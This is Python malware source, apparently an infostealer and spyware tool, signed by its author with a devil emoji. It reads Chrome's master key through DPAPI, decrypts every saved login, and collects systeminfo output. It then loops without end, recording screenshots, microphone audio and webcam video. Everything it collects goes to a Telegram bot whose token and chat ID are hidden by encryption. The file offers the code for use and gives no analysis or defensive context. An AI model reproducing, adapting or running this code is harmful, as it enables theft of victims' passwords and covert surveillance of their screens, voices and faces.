import os
import sys
import json
import base64
import sqlite3
import pandas as pd
from Crypto.Cipher import AES
import win32crypt
import pyautogui
import time
import datetime
import requests
from cryptography.fernet import Fernet
import sounddevice as sd
from scipy.io.wavfile import write
import cv2

# Load encryption key and encrypted credentials
encryption_key = b"NUQyYC8GwoFKOW-KBfHczDTdJoz5TmmTfz9RBt5i_Ac="  # Use the key from the encryption script
cipher_suite = Fernet(encryption_key)
encrypted_bot_token = b"gAAAAABnHJO8eTeC-zsy6-JtigAjjb4nhhNNSpAKxpzvDJWL-2at0KSlQgh241SpKuvHSooGqqOXrHHSS2E7mZlu-rHw_bTZ-NjQOV_yv9t1RlOeurmLAixrjwOQ_Jznz16CIv8xIoTf"
encrypted_chat_id = b"gAAAAABnHJO9WMtWcEiuDa3j8i1ws2C45mvQo34_UcVd2a21I8WNX3b2tp0pwmcqLpmI6xPcu5Mg8gBb_GQUqqrCQ5_5wgqiXA=="

# Decrypt bot token and chat ID
TOKEN = cipher_suite.decrypt(encrypted_bot_token).decode()
CHAT_ID = cipher_suite.decrypt(encrypted_chat_id).decode()

# Function to send messages to Telegram
def send_message_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Message sent to Telegram:", message)  # Optional console log
        else:
            print("Failed to send message to Telegram:", response.text)
    except Exception as e:
        print("Error sending message to Telegram:", e)

# Function to create a directory for screenshots and audio files
def createDIR():
    if not os.path.exists("img"):
        os.mkdir("img")
        send_message_to_telegram("Directory 'img' created as it didn't exist...")
    if not os.path.exists("audio"):
        os.mkdir("audio")
        send_message_to_telegram("Directory 'audio' created as it didn't exist...")

createDIR()

# Take and send a screenshot
def takess():
    timestamp = datetime.datetime.now().strftime("%Y_%m_%d-%I_%M_%S")
    ss = pyautogui.screenshot()
    filepath = f"img/S_{timestamp}.png"
    ss.save(filepath)
    send_message_to_telegram("Screenshot saved as " + filepath)
    send_screenshot(filepath)

def send_screenshot(filepath):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(filepath, 'rb') as photo:
        response = requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo})
    if response.status_code == 200:
        send_message_to_telegram("Screenshot sent to Telegram.")
    else:
        send_message_to_telegram("Failed to send screenshot: " + response.text)

# Function to record audio
def record_audio(duration=30):
    sample_rate = 44100  # Sample rate in Hertz
    output_file = f"audio/output_{datetime.datetime.now().strftime('%Y_%m_%d-%I_%M_%S')}.wav"  # Output file name
    send_message_to_telegram("Recording audio...🎙")
    audio_data = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
    sd.wait()  # Wait until the recording is finished
    write(output_file, sample_rate, audio_data)  # Save as WAV file
    send_message_to_telegram("Recording saved as " + output_file)
    send_audio(output_file)

def send_audio(filepath):
    url = f"https://api.telegram.org/bot{TOKEN}/sendAudio"
    with open(filepath, 'rb') as audio_file:
        response = requests.post(url, data={'chat_id': CHAT_ID}, files={'audio': audio_file})
    if response.status_code == 200:
        send_message_to_telegram("Audio sent to Telegram.")
    else:
        send_message_to_telegram("Failed to send audio: " + response.text)

# Send system information with chunking
def send_system_info():
    system_info = os.popen("systeminfo").read()
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

    chunk_size = 4096  # Telegram's maximum message size
    for i in range(0, len(system_info), chunk_size):
        chunk = system_info[i:i + chunk_size]
        data = {"chat_id": CHAT_ID, "text": chunk}
        try:
            response = requests.post(url, data=data)
            if response.status_code == 200:
                send_message_to_telegram("System information chunk sent to Telegram.")
            else:
                send_message_to_telegram("Failed to send system information chunk: " + response.text)
        except Exception as e:
            send_message_to_telegram("Error sending system information:" + str(e))
            time.sleep(3)

# Function to capture and send video
def capture_and_send_video(duration=60):
    video_filename = f"video_{datetime.datetime.now().strftime('%Y_%m_%d-%I_%M_%S')}.mp4"
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        send_message_to_telegram("Error: Could not open webcam.")
        return
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Change codec to support mp4
    out = cv2.VideoWriter(video_filename, fourcc, 20.0, (640, 480))

    start_time = time.time()
    while int(time.time() - start_time) < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break

    cap.release()
    out.release()
    send_video(video_filename)
    os.remove(video_filename)

def send_video(filepath):
    url = f"https://api.telegram.org/bot{TOKEN}/sendVideo"
    with open(filepath, 'rb') as video_file:
        response = requests.post(url, data={'chat_id': CHAT_ID}, files={'video': video_file})
    if response.status_code == 200:
        send_message_to_telegram("Video sent to Telegram.")
    else:
        send_message_to_telegram("Failed to send video:" + response.text)

# Get Chrome encryption key
def get_encryption_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'],
                                    'AppData', 'Local', 'Google', 'Chrome',
                                    'User Data', 'Local State')
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Decrypt password
def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(encrypted_password)
        return decrypted.decode('utf-8')
    except UnicodeDecodeError:
        send_message_to_telegram("Decryption successful, but decoding failed. Returning raw bytes.")
        return decrypted
    except Exception as e:
        send_message_to_telegram(f"Could not decrypt password: {e}")
        return ""

# Fetch Chrome passwords with retry mechanism
def fetch_and_send_chrome_passwords():
    db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                           'Google', 'Chrome', 'User Data', 'default', 'Login Data')
    key = get_encryption_key()
    
    retries = 5  # Maximum retry attempts
    delay = 3    # Delay between retries in seconds

    # Define the URL here
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

    for attempt in range(retries):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()

            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            passwords = []
            for origin_url, username, encrypted_password in cursor.fetchall():
                decrypted_password = decrypt_password(encrypted_password, key)
                passwords.append(f"URL: {origin_url}, Username: {username}, Password: {decrypted_password}")

            cursor.close()
            conn.close()
            
            # Send passwords in chunks to avoid Telegram message length limit
            for i in range(0, len(passwords), 5):  # Send 5 passwords at a time
                password_chunk = "\n".join(passwords[i:i + 5])  # Chunk size of 5 passwords
                data = {"chat_id": CHAT_ID, "text": password_chunk}
                response = requests.post(url, data=data)  # This should now work
                if response.status_code == 200:
                    send_message_to_telegram("Password chunk sent to Telegram.")
                else:
                    send_message_to_telegram("Failed to send password chunk: " + response.text)

            break  # Exit loop if successful
        except sqlite3.OperationalError as e:
            send_message_to_telegram(f"Database is locked, retrying in {delay} seconds... (Attempt {attempt + 1}/{retries})")
            time.sleep(delay)
        except Exception as e:
            send_message_to_telegram(f"An error occurred: {e}")
            break  # Exit on any other error

# Main loop to take screenshots and record audio periodically and send data
def main_loop():
    send_system_info()
    fetch_and_send_chrome_passwords()
    while True:
        takess()           # Take and send a screenshot
        record_audio(30)  # Record audio for 30 seconds
        capture_and_send_video(60)
        time.sleep(10)    # Wait for 10 seconds before the next iteration

if __name__ == '__main__':
    try:
        main_loop()
    except KeyboardInterrupt:
        send_message_to_telegram("Exiting by user request.")
        sys.exit(0)

# made with love 😈👌 by illusivehacks 